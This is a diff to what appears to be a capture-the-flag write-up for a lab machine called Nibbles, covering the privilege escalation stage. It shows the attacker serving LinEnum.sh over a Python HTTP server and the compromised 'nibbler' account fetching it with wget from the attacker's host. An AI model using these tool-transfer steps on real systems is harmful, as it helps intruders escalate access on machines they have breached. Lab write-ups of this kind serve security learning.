@@ -356,11 +356,14 @@ Objective: Escalate privileges and submit the root.txt flag.
 
 We're only `nibbler` — we need root. Lets get LinEnum on the box
 
+First, we gotta get LinEnum on our attack box, host a quick python server to send it off to our victim:
 ```Bash
 ➜  Downloads sudo python3 -m http.server 8080                                                
 Serving HTTP on :: port 8080 (http://[::]:8080/) ...
 ::ffff:10.129.123.151 - - [18/May/2026 14:18:34] "GET /LinEnum.sh HTTP/1.1" 200 -
 ```
+
+We grab it from our attack box:
 
 ```bash
 nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ wget http://10.10.15.150:8080/LinEnum.sh
@@ -375,3 +378,6 @@ LinEnum.sh          100%[===================>]  45.54K   142KB/s    in 0.3s
 
 2026-05-18 16:18:37 (142 KB/s) - 'LinEnum.sh' saved [46631/46631]
 ```
+
+
+Now 
